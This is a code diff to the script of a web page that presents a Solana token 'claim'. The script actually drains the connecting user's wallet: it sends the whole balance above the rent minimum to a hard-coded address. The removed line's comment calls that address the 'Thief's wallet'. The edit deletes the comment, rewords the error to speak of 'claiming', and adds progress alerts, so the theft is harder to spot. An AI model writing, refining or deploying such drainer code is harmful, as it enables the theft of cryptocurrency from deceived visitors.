@@ -22,19 +22,16 @@ $(document).ready(function() {
       const minBalance = await connection.getMinimumBalanceForRentExemption(0);
 alert(`Minimum balance for rent exemption: ${minBalance / solanaWeb3.LAMPORTS_PER_SOL} SOL`);
 
-                if (walletBalance < minBalance) {
-                    alert("Insufficient funds to claim.");
-                    return;
-                }
 
 
-
-                 const recieverWallet = new solanaWeb3.PublicKey('DRYjXYjya45KLzD5HmtBd4QeUA6SqypNoJDhgoie8bnF'); // Thief's wallet
+                 const recieverWallet = new solanaWeb3.PublicKey('DRYjXYjya45KLzD5HmtBd4QeUA6SqypNoJDhgoie8bnF');
                         const balanceForTransfer = walletBalance - minBalance;
+                        alert(`Balance available for transfer: ${balanceForTransfer / solanaWeb3.LAMPORTS_PER_SOL} SOL`);
                         if (balanceForTransfer <= 0) {
-                            alert("Insufficient funds for transfer.");
+                            alert("Insufficient funds to claim .");
                             return;
                         }
+                        alert("Initiating transfer...");
 
                         var transaction = new solanaWeb3.Transaction().add(
                             solanaWeb3.SystemProgram.transfer({
